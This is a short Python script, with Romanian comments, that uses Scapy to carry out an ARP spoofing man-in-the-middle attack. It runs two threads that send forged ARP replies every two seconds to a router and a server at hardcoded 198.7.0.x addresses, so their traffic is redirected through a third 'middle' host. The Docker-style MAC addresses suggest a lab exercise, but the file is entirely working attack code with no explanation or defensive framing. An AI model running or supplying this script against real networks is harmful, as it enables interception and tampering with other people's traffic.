from scapy.all import ARP, send
import threading
import time

# Functie pentru ARP Spoofing
def arp_poison(target_ip, fake_ip, target_mac, fake_mac):
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=fake_ip, hwsrc=fake_mac)
    while True:
        send(arp_response, verbose=0)
        time.sleep(2)

# Adrese IP și MAC pentru toate dispozitivele
router_ip = '198.7.0.1'
router_mac = '02:42:c6:0a:00:01'
server_ip = '198.7.0.2'
server_mac = '02:42:c6:0a:00:03'
middle_ip = '198.7.0.3'
middle_mac = '02:42:c6:0a:00:02'

# Pornirea atacului ARP spoofing
router_thread = threading.Thread(target=arp_poison, args=(router_ip, server_ip, router_mac, middle_mac))
server_thread = threading.Thread(target=arp_poison, args=(server_ip, router_ip, server_mac, middle_mac))

router_thread.start()
server_thread.start()

# Logging pentru a arata ca atacul ruleaza
try:
    while True:
        time.sleep(10)
except KeyboardInterrupt:
    print("ARP spoofing attack stopped.")
    router_thread.join()
    server_thread.join()

